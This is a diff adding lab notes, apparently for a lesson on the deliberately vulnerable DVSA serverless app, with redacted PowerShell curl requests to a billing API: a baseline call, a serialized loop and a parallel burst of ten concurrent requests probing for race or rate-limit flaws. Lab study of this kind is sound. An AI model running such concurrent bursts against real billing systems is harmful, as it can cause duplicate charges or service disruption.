@@ -1,3 +1,45 @@
-for i in {1..N}; do
-  curl -s https://<api-id>.execute-api.us-east-1.amazonaws.com/Stage/<resource>
-done
+# Lesson 06 redacted request patterns
+
+## Baseline billing request
+
+```powershell
+$API = "https://<api-id>.execute-api.us-east-1.amazonaws.com/dvsa/order"
+$TOKEN = "<REDACTED_JWT>"
+$PAYLOAD = '{"action":"billing","order-id":"<REDACTED_ORDER_ID>","data":{"ccn":"4242424242424242","exp":"05/28","cvv":"<REDACTED_CVV>"}}'
+
+curl.exe -s $API `
+  -H "Content-Type: application/json" `
+  -H "Authorization: $TOKEN" `
+  --data-raw $PAYLOAD
+```
+
+## Controlled serialized test
+
+```powershell
+1..3 | ForEach-Object {
+  curl.exe -s $API `
+    -H "Content-Type: application/json" `
+    -H "Authorization: <REDACTED_JWT>" `
+    --data-raw $PAYLOAD
+  Start-Sleep -Milliseconds 1000
+}
+```
+
+## Controlled parallel test
+
+```powershell
+1..10 | ForEach-Object {
+  Start-Job -ScriptBlock {
+    param($API, $TOKEN, $PAYLOAD)
+
+    curl.exe -s $API `
+      -H "Content-Type: application/json" `
+      -H "Authorization: $TOKEN" `
+      --data-raw $PAYLOAD
+  } -ArgumentList $API, "<REDACTED_JWT>", $PAYLOAD
+}
+
+Get-Job | Wait-Job
+Get-Job | Receive-Job
+Remove-Job *
+```
